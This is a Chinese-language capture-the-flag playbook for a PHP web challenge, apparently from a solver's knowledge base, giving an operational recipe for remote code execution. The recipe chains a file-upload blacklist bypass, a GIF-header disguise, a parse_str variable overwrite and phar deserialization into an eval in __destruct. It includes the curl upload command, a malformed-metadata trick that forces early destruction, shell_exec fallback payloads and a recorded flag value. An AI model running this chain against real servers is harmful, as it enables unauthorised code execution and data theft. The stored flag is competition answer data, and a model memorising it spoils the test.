# WEB-05（初赛 WEB-05 · Web · 200 分 · 需现场靶机）

文件上传 + phar 反序列化 RCE。**动态靶机题：flag 在决赛实例上，无离线答案，按本流程现场打。**
核心：黑名单漏 `phar` + GIF 头过 finfo + `parse_str($_POST['upload'])` 变量覆盖 +
`file_exists()` 触发 phar 反序列化 + `AnyClass::__destruct` 的 `eval`。
真正的门槛：靶机每请求结尾 `throw new Error("start")` 堵死 shutdown 析构——必须把元数据
`:1:{` 等长改成 `:2:{` 让半成品对象在 unserialize 期间立即析构。

## 现场流程（对决赛靶机 URL 执行）

```bash
cd /tmp && WORK=/opt/solver/knowledges/xihulunjian/challenges/WEB-05/exp
# 0) 先取源码：dirsearch/feroxblas 找 /www.zip（整站备份）与 /info.php（确认 mod_php）
# 1) 生成 phar（默认命令 cat /flag*；要换命令: 传参 'system("...");'）
php -d phar.readonly=0 $WORK/makephar.php
# 2) 打点（TARGET 换成决赛靶机）
curl -F "image=@evil.phar;filename=evil.phar;type=image/gif" \
     -F "upload=b=phar://uploaded_images/evil.phar/x.txt" \
     http://TARGET/upload.php
```

响应里在 `ok` / fatal error **之前**出现的输出就是命令执行结果（初赛实证直接吐出 flag）。

## 原理（备查）

- 两层过滤：扩展名黑名单精确匹配（php/phtml/pht/htaccess/user.ini…，**无 phar**）；
  finfo 内容检查（`GIF89a;` 头即过）。文件落在可直访的 `uploaded_images/`。
- `$b = 'uploaded_images/'.name` 之后 `parse_str($_POST['upload'])` —— 提交按钮参数可覆盖
  任意变量，把 `$b` 改成 `phar://uploaded_images/evil.phar/x.txt`。
- `file_exists($b)` 对 phar:// 流触发元数据反序列化；元数据是 `AnyClass`，
  `__destruct` 里 `eval($this->output)`。
- 畸形元数据（`:2:{`）使 unserialize 中途失败，半成品对象立即析构 → eval 在
  throw fatal 之前执行；SHA-1 签名覆盖元数据所以改后必须重签（makephar.php 已处理）。
- upload.php 本体两层混淆（eval+gzinflate/base64/strtr），本地 `php` 逐层剥可得真实逻辑。

## 失败分支

- 上传被拒 `Only png, jpg...`：文件名后缀必须不在黑名单（.phar 没被列）；被拒
  `i told you dear`：stub 头必须是 `GIF89a;`（makephar.php 已内置）。
- 无回显 / 只有 ok+fatal：靶机 PHP 版本若不是 7.4 系，析构时机可能不同——把命令换成
  写文件（`file_put_contents('uploaded_images/r.txt', shell_exec("cat /flag*"));`）再直访验证。
- 找不到 www.zip：黑盒打仍可行（链路不依赖源码），但先花 2 分钟目录爆破更稳。
- 命令执行成功但没 flag：`ls -la /` 找 flag 文件名再 cat。

## 决赛实测备忘

- 初赛 200 分 Web，靶机 Apache/2.4.54 + PHP 7.4.33（mod_php，.user.ini 无效）。
  初赛 flag（动态，**勿直接提交**）：`97649000032632195190566220880392`，从 `/flag*` 读出。
